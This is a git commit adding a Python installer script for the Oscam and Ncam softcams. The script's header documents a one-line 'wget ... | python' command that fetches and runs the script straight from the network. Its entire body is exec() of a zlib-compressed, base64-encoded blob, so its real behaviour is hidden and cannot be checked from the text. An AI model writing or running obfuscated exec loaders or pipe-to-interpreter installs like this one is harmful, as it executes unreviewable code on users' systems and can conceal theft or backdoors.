f64aab609c131c025d22c1016d9dbade3463880d
MOHAMED19OS <mohamed_os@gmail.com>
2022-01-07 13:20:02 +0100

    Add new Script Install oscam And Ncam

---
+++ Oscam_Ncam/installer.py
@@ -0,0 +1,12 @@
+#!/usr/bin/python
+# -*- coding; utf-8 -*-
+# ###########################################
+# SCRIPT : DOWNLOAD AND INSTALL Oscam_Ncam
+# ###########################################
+#
+# Command: wget https://raw.githubusercontent.com/MOHAMED19OS/Download/main/Oscam_Ncam/installer.py -qO - | python
+#
+# ###########################################
+import zlib
+import base64
+exec(zlib.decompress(base64.b64decode('eNrtWG1v2zYQ/q5fcVOHyS4mqXYDtHXXABvibv1gu2jaDAOGCrRE24QlUuBLHCPNfy9J07bkyIGzulk7jB9s63g8Pvfc8Y7Wox9iJXg8JjQul3LGqPcIwschpCwjdNoDJSfhcyPR8uSjEWP47a8eDEZ//DronyWjc/iYeN6EswKSZKKk4jhJgBQl4xJKTqjUUppKok17TsyEJ/my54EeTiTUuOQsxUIAEiBKD1+luJTwxk73OWe8pp+yokA0W2t7JUrnaIrhFQQ5GaeK5yeBx0SKiuQCcyPudKJnT05CXKiQP3vxfD37drsQUzItUDcsczUlNBRsIrWGCK1i4NGKsYtONzoJecdJDzBCrY0SyVkiiLSqMylL0YtjjhbRlMiZGiuBecqoxFRG2sPYsdx5MTqPz9iC5gxlcYF0sEYW/NAa9bwMT2BUYiqY4ilutR1VE810ZLaM8BURUrSC+BLxWBMUs3I+jYVEUonAqZvBsQ4grdhyxs84RsXo/BDL2Z2WnSFnllCtmOcVszsbmWGgGrpQKcMplsGuSTNvZTgnTTRUbZjvZgMrQG9WgNYBXZtIZzid6/WijDQCpmSpZGtjxr/uiRvINQ+hcwhnYGWfAC3mEFxf24MAP3ZubgI/mjBeINnaOP8zuOxtt9c0uA1frWe2npRICOetqIj3em69F5FYComLVk1sRmBxqjJDOidP4wxfxlTlOXRPf+q8XDnhcNqHoAH8Xj82MWkI6nFhQbj8B8iq/FlqTZBavv51qof+eo11IAdECF0KV/sA/KLH33SrM2SSTEiKTIGDfqFgQTQoyiQsGJ/rJ11Ulayu3iTALa8dyCraVVq+wwW7xIk99LWc1Pjul5U3jw9Oylp93KbmmLG85TZvAxHwnqujJSK3jkIYajgpDjOsTekivy/11jCOlG+l4lOzOVKShQ7KYVvXk8me0Vrkhl8cuPuUE/rNB64B4YNGr2H/vSFc94QBpqrSqZrJSmeMpLa7P9n2mcWM5HgzZecaK88p2BMO/cEHGPSHH/x2g1aTzO9AuFrbuMTv6unh3tmnevZcle8vkjtMnGild/jS8LZfq3HllV7ZvyJyz4qacEMfoeZM+G9zjASGAs0xIDfbA39nlW2Ya3L9jt+7lSH1Anq78K6Q6kjrQOem2q8CsbrEgUPxJyISIjv82zbuyM9tjlabVmw+EvuhRREp50Hj1cDdGHcK8vpRX0jbdTD2EFX46O7nY3goHcNvjw1aI4MexsXTY+RG5aw8ACehUKVx7usnyskxyKnWiIdgh9v9LrsPwM9VAz9b1EGqveTBXo5+ZywbLzG8bDc4P9Y9b76z+e71tMo3ZIwGEhTNMNce0gyWuhU5sJEfSSJz3Zfa3l1d9XvtVf+3oS84RubvOYRkc1PTePiCmzcSd1TjDI83R+o/2pCOycu/15q+WvW9Bz0NJfm4+fM91mHP0z4kCUWFeT1q6mqSmBd5SeLK6603TzXp6r+H9xn6EQpn')))
